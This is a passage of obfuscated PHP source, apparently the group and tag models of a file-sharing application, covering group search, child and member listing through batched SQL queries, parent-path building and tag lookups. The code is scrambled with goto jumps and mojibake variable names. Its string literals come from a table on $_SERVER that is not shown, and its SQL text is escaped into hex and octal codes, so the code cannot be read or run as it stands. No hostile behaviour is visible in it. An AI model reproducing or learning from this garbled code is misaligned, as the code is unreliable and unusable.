array($eÅ‘ôôŒªˆ[774], $Fëò¸à©«))); } $E—İí­Ê = $this->_makeOrder()->where($C˜‚Ö¸«‡à)->selectPage(20); $E—İí­Ê = $E—İí­Ê ? $E—İí­Ê : array(); goto d¬İôÏëæ; FİÌ«êš§Û: $eÅ‘ôôŒªˆ =& $_SERVER[ã®Â„Éæ¹¤]; $DÉí¤ÈÃ˜ = $câĞÃ×éÓ[$eÅ‘ôôŒªˆ[2208]]; $D½·ø²»ã = isset($câĞÃ×éÓ[$eÅ‘ôôŒªˆ[2209]]) ? $câĞÃ×éÓ[$eÅ‘ôôŒªˆ[2209]] : !1; goto cÈ‡Äê¤; d¬İôÏëæ: if (!$E—İí­Ê || count($E—İí­Ê[$eÅ‘ôôŒªˆ[354]]) < 5 && Input::check($DÉí¤ÈÃ˜, $eÅ‘ôôŒªˆ[306])) { goto c²ğ”´Ÿ‰¹; c²ğ”´Ÿ‰¹: $dòÑÇĞˆï„ = $this->groupChildrenAll($D½·ø²»ã); $A¾Ä‡ÏÀë = $this->_searchFromMeta($eÅ‘ôôŒªˆ[415], $DÉí¤ÈÃ˜, 10, $dòÑÇĞˆï„); $B¥´­ÛĞ¯ = $this->_searchFromMeta($eÅ‘ôôŒªˆ[416], $DÉí¤ÈÃ˜, 10, $dòÑÇĞˆï„); goto CßˆÇõÏèÕ; c˜ó‚¡ÓĞ: $E—İí­Ê[$eÅ‘ôôŒªˆ[351]][$eÅ‘ôôŒªˆ[353]] = ceil($E—İí­Ê[$eÅ‘ôôŒªˆ[351]][$eÅ‘ôôŒªˆ[352]] / $E—İí­Ê[$eÅ‘ôôŒªˆ[351]][$eÅ‘ôôŒªˆ[349]]); goto C‰ÃŞ…í·Õ; CßˆÇõÏèÕ: $a¾ˆñ‚ß© = array_merge($A¾Ä‡ÏÀë, $B¥´­ÛĞ¯, $E—İí­Ê[$eÅ‘ôôŒªˆ[354]]); $E—İí­Ê[$eÅ‘ôôŒªˆ[354]] = array_unique_by_key($a¾ˆñ‚ß©, $eÅ‘ôôŒªˆ[2127]); $E—İí­Ê[$eÅ‘ôôŒªˆ[351]][$eÅ‘ôôŒªˆ[352]] = count($E—İí­Ê[$eÅ‘ôôŒªˆ[354]]); goto c˜ó‚¡ÓĞ; C‰ÃŞ…í·Õ: } $this->_listDataApply($E—İí­Ê[$eÅ‘ôôŒªˆ[354]]); return $E—İí­Ê; goto E‡êÍ†¶‹ƒ; cÈ‡Äê¤: if (!trim($DÉí¤ÈÃ˜)) { return !1; } $DÉí¤ÈÃ˜ = str_replace($eÅ‘ôôŒªˆ[2210], $eÅ‘ôôŒªˆ[2211], $DÉí¤ÈÃ˜); $C˜‚Ö¸«‡à = array($eÅ‘ôôŒªˆ[2127] => array($eÅ‘ôôŒªˆ[774], "\x25{$DÉí¤ÈÃ˜}\45"), $eÅ‘ôôŒªˆ[28] => array($eÅ‘ôôŒªˆ[774], "\45{$DÉí¤ÈÃ˜}\45"), $eÅ‘ôôŒªˆ[932] => $eÅ‘ôôŒªˆ[2212]); goto A«½è£ã‘´; E‡êÍ†¶‹ƒ: } protected function groupChildrenAll($b»´İÈ„—) { $F×ÚçÓã‚ =& $_SERVER[ã®Â„Éæ¹¤]; if (!$b»´İÈ„—) { return !1; } if (is_string($b»´İÈ„—)) { $b»´İÈ„— = array($b»´İÈ„—); } $dà­Ä¨Œò = $b»´İÈ„—; foreach ($b»´İÈ„— as $D³ÚÎù÷õÜ) { $F¬Šˆ’ŠÛ„ = $this->getInfoSimple($D³ÚÎù÷õÜ); $b†¹×É·Öœ = array($F×ÚçÓã‚[461] => array($F×ÚçÓã‚[774], $F¬Šˆ’ŠÛ„[$F×ÚçÓã‚[461]] . $D³ÚÎù÷õÜ . $F×ÚçÓã‚[486])); $D²‚É Üªè = $this->field($F×ÚçÓã‚[2127])->where($b†¹×É·Öœ)->select(); $dà­Ä¨Œò = array_merge($dà­Ä¨Œò, array_to_keyvalue($D²‚É Üªè, $F×ÚçÓã‚[33], $F×ÚçÓã‚[2127])); } return array_unique($dà­Ä¨Œò); } private function _searchFromMeta($F¬Á”Ë÷Ø, $E‡›¿‰…×, $D“›¹Ôğ‘ò, $FÁ¦êó¬¢Æ) { goto f¬Ã’ŒÉøñ; Cï†¹õãî: return $F…Ã£Ùâ¹±; goto bÖ‚ÎĞÏ‘ø; f¬Ã’ŒÉøñ: $b á•«õ—‰ =& $_SERVER[ã®Â„Éæ¹¤]; $E‡›¿‰…× = strtolower($E‡›¿‰…×); $FâÄóÜ‰Â = array($b á•«õ—‰[89] => $F¬Á”Ë÷Ø, $b á•«õ—‰[359] => array($b á•«õ—‰[774], "\45{$E‡›¿‰…×}\x25")); goto f•œÍ¬ùÚ¡; FÓÕ˜™ÆÂ: $EçÔ¤¥‚Ü = array_to_keyvalue($EçÔ¤¥‚Ü, $b á•«õ—‰[33], $b á•«õ—‰[2127]); $F…Ã£Ùâ¹± = $this->where(array($b á•«õ—‰[2204] => array($b á•«õ—‰[7], $EçÔ¤¥‚Ü)))->select(); if (!$F…Ã£Ùâ¹±) { return array(); } goto Cï†¹õãî; f•œÍ¬ùÚ¡: if ($FÁ¦êó¬¢Æ) { $FâÄóÜ‰Â[$b á•«õ—‰[2127]] = array($b á•«õ—‰[7], $FÁ¦êó¬¢Æ); } $EçÔ¤¥‚Ü = Model($b á•«õ—‰[2213])->where($FâÄóÜ‰Â)->limit($D“›¹Ôğ‘ò)->select(); if (!$EçÔ¤¥‚Ü) { return array(); } goto FÓÕ˜™ÆÂ; bÖ‚ÎĞÏ‘ø: } protected function _listDataApplyItem($cƒäÑÈÔÃ) { $F¾Æç¨åğÇ = array($cƒäÑÈÔÃ); $this->_listDataApply($F¾Æç¨åğÇ); return $F¾Æç¨åğÇ[0]; } protected function _listDataApply(&$e¦ªÀö„Ç) { goto e›”÷ÔÚ“§; e›”÷ÔÚ“§: $A˜¦•„‡÷Ü =& $_SERVER[ã®Â„Éæ¹¤]; if (!$e¦ªÀö„Ç) { return; } $fµ¹äàÛŞ = array_to_keyvalue($e¦ªÀö„Ç, $A˜¦•„‡÷Ü[33], $A˜¦•„‡÷Ü[2127]); goto cêƒ„›ÃÎ…; cÆ¸ŠÃßôŒ: $this->_listAppendParent($e¦ªÀö„Ç); $this->_listAppendSourceRoot($e¦ªÀö„Ç, $fµ¹äàÛŞ); goto DÊô±îÍˆ½; cêƒ„›ÃÎ…: $this->_listAppendChildren($e¦ªÀö„Ç); $this->_listAppendChildrenMember($e¦ªÀö„Ç); $this->_listAppendMeta($e¦ªÀö„Ç, $fµ¹äàÛŞ); goto cÆ¸ŠÃßôŒ; DÊô±îÍˆ½: } private function _listAppendChildren(&$BŞƒ…£¯·) { goto C¼»ïŒ‘Àà; eˆ«Ü¢Ğ¥’: $a›‘‰–ã = count($BŞƒ…£¯·); $D£Ö·À×Ì = $this->tablePrefix . $this->tableName; for ($fíä”Ÿóìì = 0, $Fƒç°èã´Ë = 0; $fíä”Ÿóìì < $a›‘‰–ã; $fíä”Ÿóìì++) { $Fƒç°èã´Ë++; $E…ê˜“Ë¶ = $BŞƒ…£¯·[$fíä”Ÿóìì][$A­ÈÔ¢¬Üğ[2127]]; $A‰ÏéØğŸ’ .= "\123\105\x4c\x45\103\x54\x20\52\40\x46\122\117\115\x20\50\x53\x45\x4c\x45\x43\124\40\47{$E…ê˜“Ë¶}\x5f\x63\x68\x69\154\x64\x27\x20\141\x73\x20\x68\x61\163\40\106\122\x4f\115\x20\140{$D£Ö·À×Ì}\x60\x20\167\x68\x65\x72\145\x20\160\141\162\145\x6e\x74\111\104\75{$E…ê˜“Ë¶}\x20\154\x69\x6d\151\x74\x20\x31\x29\40\141\163\40\x74\142\137{$E…ê˜“Ë¶}\x20\165\x6e\151\x6f\156\40\x61\154\x6c\40"; if (($Fƒç°èã´Ë >= 20 || $fíä”Ÿóìì == $a›‘‰–ã - 1) && $A‰ÏéØğŸ’) { $A‰ÏéØğŸ’ = substr($A‰ÏéØğŸ’, 0, -strlen($A­ÈÔ¢¬Üğ[451])); $Bº¬¯ê´óê = $this->query($A‰ÏéØğŸ’); $döŸÆä¹†Ô = array_merge($döŸÆä¹†Ô, $Bº¬¯ê´óê); $Fƒç°èã´Ë = 0; $A‰ÏéØğŸ’ = $A­ÈÔ¢¬Üğ[33]; } } goto C¿öÂ‰šì†; C¼»ïŒ‘Àà: $A­ÈÔ¢¬Üğ =& $_SERVER[ã®Â„Éæ¹¤]; $A‰ÏéØğŸ’ = $A­ÈÔ¢¬Üğ[361]; $döŸÆä¹†Ô = array(); goto eˆ«Ü¢Ğ¥’; C¿öÂ‰šì†: $döŸÆä¹†Ô = array_to_keyvalue($döŸÆä¹†Ô, $A­ÈÔ¢¬Üğ[452]); foreach ($BŞƒ…£¯· as &$d½øÙ½í) { $d½øÙ½í[$A­ÈÔ¢¬Üğ[2214]] = isset($döŸÆä¹†Ô[$d½øÙ½í[$A­ÈÔ¢¬Üğ[2127]] . $A­ÈÔ¢¬Üğ[2215]]); } unset($d½øÙ½í); goto b¹˜ª´Õ†æ; b¹˜ª´Õ†æ: } private function _listAppendChildrenMember(&$c¶°²¶„½) { goto CÜ¼–ñ‚ğŒ; F¥Ï´§öƒ: $fÓ¥‘Öš = count($c¶°²¶„½); $E‚†‘¶§Ü = $this->tablePrefix . $eÅâöÎ¶[2206]; for ($AÙ¤ÚÁƒ— = 0, $aöä…Í¤ÉÉ = 0; $AÙ¤ÚÁƒ— < $fÓ¥‘Öš; $AÙ¤ÚÁƒ—++) { $aöä…Í¤ÉÉ++; $F¥ÕµçÔˆò = $c¶°²¶„½[$AÙ¤ÚÁƒ—][$eÅâöÎ¶[2127]]; $dçÃ³»¥éİ .= "\x53\x45\114\105\103\124\40\52\x20\106\122\x4f\115\40\x28\x53\105\114\105\103\x54\40\47{$F¥ÕµçÔˆò}\x5f\143\x68\x69\154\x64\47\x20\x61\163\x20\150\141\x73\x20\106\122\117\x4d\x20\140{$E‚†‘¶§Ü}\x60\x20\167\x68\x65\162\x65\x20\147\x72\157\x75\x70\111\x44\75{$F¥ÕµçÔˆò}\x20\154\x69\155\x69\164\x20\x31\51\40\141\x73\x20\164\142\137{$F¥ÕµçÔˆò}\x20\165\x6e\x69\157\156\x20\141\154\154\40"; if (($aöä…Í¤ÉÉ >= 20 || $AÙ¤ÚÁƒ— == $fÓ¥‘Öš - 1) && $dçÃ³»¥éİ) { $dçÃ³»¥éİ = substr($dçÃ³»¥éİ, 0, -strlen($eÅâöÎ¶[451])); $a‘²‹âƒ¯ = $this->query($dçÃ³»¥éİ); $AÃ£¶…æ = array_merge($AÃ£¶…æ, $a‘²‹âƒ¯); $aöä…Í¤ÉÉ = 0; $dçÃ³»¥éİ = $eÅâöÎ¶[33]; } } goto BßâÌ×¸¸Û; BßâÌ×¸¸Û: $AÃ£¶…æ = array_to_keyvalue($AÃ£¶…æ, $eÅâöÎ¶[452]); foreach ($c¶°²¶„½ as &$eÁç°êò°á) { $eÁç°êò°á[$eÅâöÎ¶[2216]] = isset($AÃ£¶…æ[$eÁç°êò°á[$eÅâöÎ¶[2127]] . $eÅâöÎ¶[2215]]); } unset($eÁç°êò°á); goto E¼ôÖÈÚÆ; CÜ¼–ñ‚ğŒ: $eÅâöÎ¶ =& $_SERVER[ã®Â„Éæ¹¤]; $dçÃ³»¥éİ = $eÅâöÎ¶[361]; $AÃ£¶…æ = array(); goto F¥Ï´§öƒ; E¼ôÖÈÚÆ: } private function _listAppendMeta(&$bØË—£®‚, $bªÙ‡Äº—) { goto EóòŸ®‡ƒ; cíáÉÏ»›–: $bæŸÊæŠéÛ = array_to_keyvalue_group($bæŸÊæŠéÛ, $fæ®‰óñ“ö[2127]); foreach ($bæŸÊæŠéÛ as &$C¾­˜—¯åµ) { $C¾­˜—¯åµ = array_to_keyvalue($C¾­˜—¯åµ, $fæ®‰óñ“ö[89], $fæ®‰óñ“ö[359]); } unset($C¾­˜—¯åµ); goto d‹ëˆõÉÔß; d‹ëˆõÉÔß: foreach ($bØË—£®‚ as &$D£ƒŞé) { $D£ƒŞé[$fæ®‰óñ“ö[417]] = array(); if (isset($bæŸÊæŠéÛ[$D£ƒŞé[$fæ®‰óñ“ö[2127]]])) { $D£ƒŞé[$fæ®‰óñ“ö[417]] = $bæŸÊæŠéÛ[$D£ƒŞé[$fæ®‰óñ“ö[2127]]]; } } unset($D£ƒŞé); goto dŠĞ¯É—–“; EóòŸ®‡ƒ: $fæ®‰óñ“ö =& $_SERVER[ã®Â„Éæ¹¤]; $Fò®çÈš• = array($fæ®‰óñ“ö[2127] => array($fæ®‰óñ“ö[7], $bªÙ‡Äº—)); $bæŸÊæŠéÛ = Model($fæ®‰óñ“ö[2205])->where($Fò®çÈš•)->select(); goto cíáÉÏ»›–; dŠĞ¯É—–“: } protected function parentLevelArray($B§ª­åÑ‰„) { $FìŒ«ËÃÏ =& $_SERVER[ã®Â„Éæ¹¤]; $B§ª­åÑ‰„ = explode($FìŒ«ËÃÏ[47], trim($B§ª­åÑ‰„, $FìŒ«ËÃÏ[47])); $B§ª­åÑ‰„ = array_remove_value($B§ª­åÑ‰„, $FìŒ«ËÃÏ[470]); return $B§ª­åÑ‰„; } private function _listAppendParent(&$B§ÌŞªø¼Ì) { goto eßâÊ¢à¾İ; eßâÊ¢à¾İ: $C×Ç•ï“Ã¶ =& $_SERVER[ã®Â„Éæ¹¤]; $EµÖÈŒ¿¥İ = array(); foreach ($B§ÌŞªø¼Ì as &$eªééÎ’ïÑ) { $EµÖÈŒ¿¥İ[$eªééÎ’ïÑ[$C×Ç•ï“Ã¶[2127]]] = $eªééÎ’ïÑ[$C×Ç•ï“Ã¶[28]]; $BÕËŒÎÉğ = $this->parentLevelArray($eªééÎ’ïÑ[$C×Ç•ï“Ã¶[461]]); foreach ($BÕËŒÎÉğ as $f÷“Œ£„ë²) { if (!isset($EµÖÈŒ¿¥İ[$f÷“Œ£„ë²])) { $EµÖÈŒ¿¥İ[$f÷“Œ£„ë²] = 0; } } } goto aÍÓù©å×; aÍÓù©å×: unset($eªééÎ’ïÑ); $fÇãâğ¡â = array(); foreach ($EµÖÈŒ¿¥İ as $eÈòÇÖÎÛ– => $f–®¬§‰ö) { if (!$f–®¬§‰ö) { $fÇãâğ¡â[] = $eÈòÇÖÎÛ–; } } goto BÂ…İõò ¿; BÂ…İõò ¿: if ($fÇãâğ¡â) { $aÏñ•ëİ…Ü = array($C×Ç•ï“Ã¶[2204] => array($C×Ç•ï“Ã¶[384], $fÇãâğ¡â)); $b‹­Ìì¤Ú¹ = $this->field($C×Ç•ï“Ã¶[2217])->where($aÏñ•ëİ…Ü)->select(); $e ÒŒµ†‹ = array_to_keyvalue($b‹­Ìì¤Ú¹, $C×Ç•ï“Ã¶[2127], $C×Ç•ï“Ã¶[28]); $EµÖÈŒ¿¥İ = array_merge_index($EµÖÈŒ¿¥İ, $e ÒŒµ†‹); } $B’´‡ÊÁ¥ = $GLOBALS[$C×Ç•ï“Ã¶[6]][$C×Ç•ï“Ã¶[84]][$C×Ç•ï“Ã¶[2218]]; foreach ($B§ÌŞªø¼Ì as &$eªééÎ’ïÑ) { $BÕËŒÎÉğ = $this->parentLevelArray($eªééÎ’ïÑ[$C×Ç•ï“Ã¶[461]]); $a³´¥é•ò« = $C×Ç•ï“Ã¶[33]; foreach ($BÕËŒÎÉğ as $eÈòÇÖÎÛ– => $f÷“Œ£„ë²) { if ($B’´‡ÊÁ¥ && $eÈòÇÖÎÛ– == 0) { continue; } $a³´¥é•ò« .= $EµÖÈŒ¿¥İ[$f÷“Œ£„ë²] . $C×Ç•ï“Ã¶[8]; } if ($BÕËŒÎÉğ) { $a³´¥é•ò« .= $eªééÎ’ïÑ[$C×Ç•ï“Ã¶[28]]; } $eªééÎ’ïÑ[$C×Ç•ï“Ã¶[465]] = str_replace($C×Ç•ï“Ã¶[469], $C×Ç•ï“Ã¶[8], $a³´¥é•ò«); } goto Eœ«Í“µã; Eœ«Í“µã: unset($eªééÎ’ïÑ); goto Eä™¶¢ô®ô; Eä™¶¢ô®ô: } private function _listAppendSourceRoot(&$Fá‰—²Ã¨Ğ, $DÉ°‡ã…¤) { goto aµ¬¶Ì®Æ¯; A²±‘§¹ê: foreach ($Fá‰—²Ã¨Ğ as &$dº£Äñ¡§™) { $dº£Äñ¡§™[$eæÍë›’„¾[391]] = $FÜ™ÖÉäª§[$dº£Äñ¡§™[$eæÍë›’„¾[2127]]] ? $FÜ™ÖÉäª§[$dº£Äñ¡§™[$eæÍë›’„¾[2127]]] : array(); } unset($dº£Äñ¡§™); goto Cœßó¿Ø‘; DˆªÅÇ´“: $FÜ™ÖÉäª§ = Model($eæÍë›’„¾[775])->order($eæÍë›’„¾[2220])->field($EÁ´ñäò´)->where($c÷Âš…àÉß)->select(); $FÜ™ÖÉäª§ = array_to_keyvalue($FÜ™ÖÉäª§, $eæÍë›’„¾[458]); $FÜ™ÖÉäª§ = array_remove_key($FÜ™ÖÉäª§, $eæÍë›’„¾[458]); goto A²±‘§¹ê; aµ¬¶Ì®Æ¯: $eæÍë›’„¾ =& $_SERVER[ã®Â„Éæ¹¤]; $c÷Âš…àÉß = array($eæÍë›’„¾[371] => SourceModel::TYPE_GROUP, $eæÍë›’„¾[463] => 0, $eæÍë›’„¾[458] => array($eæÍë›’„¾[7], $DÉ°‡ã…¤)); $EÁ´ñäò´ = $eæÍë›’„¾[2219]; goto DˆªÅÇ´“; Cœßó¿Ø‘: } protected function groupMerge($a¤µ‰ÛÒÁ) { $a¤µ‰ÛÒÁ = array_values(array_unique($a¤µ‰ÛÒÁ)); $D’Ø¶Ÿò = array(); for ($d‡ÀöÇŠ…ƒ = 0; $d‡ÀöÇŠ…ƒ < count($a¤µ‰ÛÒÁ); $d‡ÀöÇŠ…ƒ++) { $Aˆ“µ¦‚ = !1; for ($cÚÕ ´ Â = 0; $cÚÕ ´ Â < count($a¤µ‰ÛÒÁ); $cÚÕ ´ Â++) { if ($d‡ÀöÇŠ…ƒ == $cÚÕ ´ Â) { continue; } if ($this->isParentOf($a¤µ‰ÛÒÁ[$cÚÕ ´ Â], $a¤µ‰ÛÒÁ[$d‡ÀöÇŠ…ƒ])) { $Aˆ“µ¦‚ = !0; break; } } if (!$Aˆ“µ¦‚) { $D’Ø¶Ÿò[] = $a¤µ‰ÛÒÁ[$d‡ÀöÇŠ…ƒ]; } } return $D’Ø¶Ÿò; } protected function isParentOf($D½›Ÿ†±’ô, $Dà½ÑÃîŠÅ) { goto E‹Ì¾ìĞÖÄ; dŒÊ•íœ¤Á: $FĞÛ£íŸ«Û = $this->getInfoSimple($Dà½ÑÃîŠÅ); $FâÎëØå‰¥ = $FÌÛÈµøï°[$Cï¨¡ªƒª[461]] . $D½›Ÿ†±’ô . $Cï¨¡ªƒª[47]; if (substr($FĞÛ£íŸ«Û[$Cï¨¡ªƒª[461]], 0, strlen($FâÎëØå‰¥)) == $FâÎëØå‰¥) { return !0; } goto Eä¨°ã„µ; E‹Ì¾ìĞÖÄ: $Cï¨¡ªƒª =& $_SERVER[ã®Â„Éæ¹¤]; if (!$D½›Ÿ†±’ô || !$Dà½ÑÃîŠÅ || $D½›Ÿ†±’ô == $Dà½ÑÃîŠÅ) { return !1; } $FÌÛÈµøï° = $this->getInfoSimple($D½›Ÿ†±’ô); goto dŒÊ•íœ¤Á; Eä¨°ã„µ: return !1; goto bÈÏëŒ™µ¾; bÈÏëŒ™µ¾: } public function groupShowRoot($EÎ™Ñ®ŠÂ, $a¹²¸Ğ°õ = false) { goto b±Ì««Ú‚ˆ; Aø´ñô‚Ì¤: $A¥ÉêÚÙ†› = $this->parentLevelArray($Aâæå’Óù[$B¿Ø®ª´Û‘[461]]); $Cƒéòˆìª = array($EÎ™Ñ®ŠÂ); if (count($A¥ÉêÚÙ†›) == 0) { return $Cƒéòˆìª; } goto bòå¿ÂŸ¬œ; b±Ì««Ú‚ˆ: $B¿Ø®ª´Û‘ =& $_SERVER[ã®Â„Éæ¹¤]; $Aâæå’Óù = $this->getInfo($EÎ™Ñ®ŠÂ); if (!$Aâæå’Óù) { return array(); } goto Aø´ñô‚Ì¤; bø¤Ôß†‚: return $Cƒéòˆìª; goto bë¡Ù«ƒ¢; bòå¿ÂŸ¬œ: if ($a¹²¸Ğ°õ && count($A¥ÉêÚÙ†›) == 1) { return $Cƒéòˆìª; } if (!$Aâæå’Óù[$B¿Ø®ª´Û‘[417]] || !isset($Aâæå’Óù[$B¿Ø®ª´Û‘[417]][$B¿Ø®ª´Û‘[2202]]) || $Aâæå’Óù[$B¿Ø®ª´Û‘[417]][$B¿Ø®ª´Û‘[2202]] == $B¿Ø®ª´Û‘[2176]) { return $this->groupShowRoot($A¥ÉêÚÙ†›[count($A¥ÉêÚÙ†›) - 1], $a¹²¸Ğ°õ); } if ($Aâæå’Óù[$B¿Ø®ª´Û‘[417]][$B¿Ø®ª´Û‘[2202]] == $B¿Ø®ª´Û‘[346]) { $fåø§åÄàğ = explode($B¿Ø®ª´Û‘[47], $Aâæå’Óù[$B¿Ø®ª´Û‘[417]][$B¿Ø®ª´Û‘[2203]]); if ($fåø§åÄàğ) { $Cƒéòˆìª = array_merge($Cƒéòˆìª, $fåø§åÄàğ); } } goto bø¤Ôß†‚; bë¡Ù«ƒ¢: } protected function resetParentLevel() { $dèæ„œ˜Û =& $_SERVER[ã®Â„Éæ¹¤]; $A„œ‡¹šŞ = $dèæ„œ˜Û[2127]; $f²À œÙ  = $this->select(); $f²À œÙ  = array_to_keyvalue($f²À œÙ , $A„œ‡¹šŞ); foreach ($f²À œÙ  as $Eƒ”íÒê) { goto a„ñÔŞÜ˜”; B¸ª›õÚ‹½: $this->where(array($A„œ‡¹šŞ => $Eƒ”íÒê[$A„œ‡¹šŞ]))->save(array($dèæ„œ˜Û[527] => $C¹¢Èƒ…©à)); goto cÌ­–ÁÔ¢; AÆ¸èÙÇá: $C¹¢Èƒ…©à[] = 0; $C¹¢Èƒ…©à = $dèæ„œ˜Û[47] . implode($dèæ„œ˜Û[47], array_reverse($C¹¢Èƒ…©à)) . $dèæ„œ˜Û[47]; $this->setNamePinyin($Eƒ”íÒê[$A„œ‡¹šŞ], $Eƒ”íÒê[$dèæ„œ˜Û[28]]); goto B¸ª›õÚ‹½; a„ñÔŞÜ˜”: $dÙåÅÊæ  = $Eƒ”íÒê; $C¹¢Èƒ…©à = array(); while ($dÙåÅÊæ [$dèæ„œ˜Û[463]] != 0) { $C¹¢Èƒ…©à[] = $dÙåÅÊæ [$dèæ„œ˜Û[463]]; $dÙåÅÊæ  = $f²À œÙ [$dÙåÅÊæ [$dèæ„œ˜Û[463]]]; } goto AÆ¸èÙÇá; cÌ­–ÁÔ¢: } return $f²À œÙ ; } public function groupNameAuto($cÉ¦¶ò¥æ, $cÑ‘šòí¯Ÿ) { $d˜¡ñÂ¥¬† =& $_SERVER[ã®Â„Éæ¹¤]; $Cåİ’éø§ = $this->where(array($d˜¡ñÂ¥¬†[368] => $cÉ¦¶ò¥æ))->getField($d˜¡ñÂ¥¬†[28], !0); if (!$Cåİ’éø§ || !in_array($cÑ‘šòí¯Ÿ, $Cåİ’éø§)) { return $cÑ‘šòí¯Ÿ; } for ($aÈ‹¿ƒŸÆå = 1; $aÈ‹¿ƒŸÆå <= count($Cåİ’éø§) + 1; $aÈ‹¿ƒŸÆå++) { $CÚ“Ä¡¹Ş = $cÑ‘šòí¯Ÿ . "\50{$aÈ‹¿ƒŸÆå}\x29"; if (!in_array($CÚ“Ä¡¹Ş, $Cåİ’éø§)) { return $CÚ“Ä¡¹Ş; } } } } class GroupTagModel extends ModelBase { protected $tableName = "\165\163\145\x72\137\146\141\x76"; protected function cacheFunctionAlias($a‰•ßœ‚ïÍ) { $EìªÑéòÕŠ =& $_SERVER[ã®Â„Éæ¹¤]; return array($EìªÑéòÕŠ[2221] => array($a‰•ßœ‚ïÍ[0], $EìªÑéòÕŠ[2222]), $EìªÑéòÕŠ[2223] => array($a‰•ßœ‚ïÍ[0], $EìªÑéòÕŠ[2224])); } protected function get($D²­’†¬Ä) { $E¯Ø–¡°±† =& $_SERVER[ã®Â„Éæ¹¤]; $Dì÷¦ˆ¦‘ = Model($E¯Ø–¡°±†[460])->metaGet($D²­’†¬Ä, $E¯Ø–¡°±†[2225]); $cîµ˜õŠÄò = json_decode($Dì÷¦ˆ¦‘, !0); return $cîµ˜õŠÄò ? $cîµ˜õŠÄò : array($E¯Ø–¡°±†[2226] => $E¯Ø–¡°±†[83], $E¯Ø–¡°±†[354] => array()); } protected function set($fæóÉ³¸ù§, $dÌÚ²ºË›õ) { $CïÇòî®Î =& $_SERVER[ã®Â„Éæ¹¤]; $dÌÚ²ºË›õ = $dÌÚ²ºË›õ ? $dÌÚ²ºË›õ : array($CïÇòî®Î[2226] => $CïÇòî®Î[83], $CïÇòî®Î[354] => array()); Model($CïÇòî®Î[460])->metaSet($fæóÉ³¸ù§, $CïÇòî®Î[2225], json_encode($dÌÚ²ºË›õ)); return Model($CïÇòî®Î[460])->metaSet($fæóÉ³¸ù§, $CïÇòî®Î[2225], json_encode($dÌÚ²ºË›õ)); } protected function getByTagID($AÓ» é÷ˆ, $eØ°Š–Ôª) { goto B‘àÇ–±É; B˜÷ÖÈŸˆÎ: return is_array($E¹²²ÄÑ‡) ? $E¹²²ÄÑ‡ : !1; goto dƒåŸ˜æªù; BèïªÇÁ: $f¡ Øã¨ÕÔ = $this->get($AÓ» é÷ˆ); if (!$f¡ Øã¨ÕÔ || !isset($f¡ Øã¨ÕÔ[$f†İË£‡è[354]])) { return !1; } $E¹²²ÄÑ‡ = array_find_by_field($f¡ Øã¨ÕÔ[$f†İË£‡è[354]], $f†İË£‡è[367], $eØ°Š–Ôª); goto B˜÷ÖÈŸˆÎ; B‘àÇ–±É: $f†İË£‡è =& $_SERVER[ã®Â„Éæ¹¤]; if (!$AÓ» é÷ˆ || !$eØ°Š–Ôª) { return !1; } if (!Model($f†İË£‡è[460])->getInfoSimple($AÓ» é÷ˆ)) { return !1; } goto BèïªÇÁ; dƒåŸ˜æªù: } public function listSource($A¨òİŠ§ È, $b·Ù§”Éœó) { goto C†ÕË‹¡‹ó; Få÷‚“îÆ: if ($D °¬ãÅ…ë) { $this->removeBySource($A¨òİŠ§ È, $D °¬ãÅ…ë); } return $AßØì‚©®; goto díÑšÒÙØ; BŒˆËâ¦ù: foreach ($cİ°¨µ´·å as $FÜÄÑĞ÷Ó“ => $Eˆ©¼±ä¸) { $EÑ½ÖƒÔ†Ú = !0; if (!$b·Ù§”Éœó) { $aÆÛ¼ê¦Ï˜[] = $FÜÄÑĞ÷Ó“; continue; } foreach ($b·Ù§”Éœó as $E„­èÍªÈ¼) { if (!in_array($E„­èÍªÈ¼, $Eˆ©¼±ä¸)) { $EÑ½ÖƒÔ†Ú = !1; break; } } if ($EÑ½ÖƒÔ†Ú) { $aÆÛ¼ê¦Ï˜[] = $FÜÄÑĞ÷Ó“; } } if (!$aÆÛ¼ê¦Ï˜) { return array(); } $AßØì‚©® = Model($cÉ ¾›ÚÉ[1136])->listSource(array($cÉ ¾›ÚÉ[383] => array($cÉ ¾›ÚÉ[384], $aÆÛ¼ê¦Ï˜))); goto aÔ¸‹£õ¨©; C†ÕË‹¡‹ó: $cÉ ¾›ÚÉ =& $_SERVER[ã®Â„Éæ¹¤]; if ($b·Ù§”Éœó && !is_array($b·Ù§”Éœó)) { $b·Ù§”Éœó = array($b·Ù§”Éœó); } $d§ö—Ë‹Œ¥ = $this->listData($A¨òİŠ§ È); goto bÉÖàÙÒ¥Ò; bÉÖàÙÒ¥Ò: $cİ°¨µ´·å = array(); foreach ($d§ö—Ë‹Œ¥ as $fº­ãå®”Õ) { $Aê¶é²Íµ = $fº­ãå®”Õ[$cÉ ¾›ÚÉ[75]]; if (!$Aê¶é²Íµ) { continue; } if (!isset($cİ°¨µ´·å[$Aê¶é²Íµ])) { $cİ°¨µ´·å[$Aê¶é²Íµ] = array(); } $cİ°¨µ´·å[$Aê¶é²Íµ][] = $fº­ãå®”Õ[$cÉ ¾›ÚÉ[393]]; } $aÆÛ¼ê¦Ï˜ = array(); goto BŒˆËâ¦ù; dçåÙ°Ü“Ê: $Fœ‘ò©£ïÆ = array_to_keyvalue($AßØì‚©®[$cÉ ¾›ÚÉ[73]], $cÉ ¾›ÚÉ[33], $cÉ ¾›ÚÉ[369]); $FØˆŠÅ“ô = array_merge($Fœ‘ò©£ïÆ, $C»”Ö¨ØÙê); foreach ($aÆÛ¼ê¦Ï˜ as $Aê¶é²Íµ) { if (!in_array($Aê¶é²Íµ, $FØˆŠÅ“ô)) { $D °¬ãÅ…ë[] = $Aê¶é²Íµ; } } goto Få÷‚“îÆ; aÔ¸‹£õ¨©: if (!$AßØì‚©® || count($aÆÛ¼ê¦Ï˜) == $AßØì‚©®[$cÉ ¾›ÚÉ[351]][$cÉ ¾›ÚÉ[352]]) { return $AßØì‚©®; } $D °¬ãÅ…ë = array(); $C»”Ö¨ØÙê = array_to_keyvalue($AßØì‚©®[$cÉ ¾›ÚÉ[74]], $cÉ ¾›ÚÉ[33], $cÉ ¾›ÚÉ[369]); goto dçåÙ°Ü“Ê; díÑšÒÙØ: } protected function listData($Fîä˜Ñß) { $A‘°Î–æ‡¢ =& $_SERVER[ã®Â„Éæ¹¤]; $AÛ—öŞ¸Ÿî = array($A‘°Î–æ‡¢[1447] => 0, $A‘°Î–æ‡¢[436] => array($A‘°Î–æ‡¢[2227], 0), $A‘°Î–æ‡¢[388] => $A‘°Î–æ‡¢[2228] . $Fîä˜Ñß); $a¡‡ßÒÆ¬× = $A‘°Î–æ‡¢[2229]; $Eç­Ü²‡‘ë = 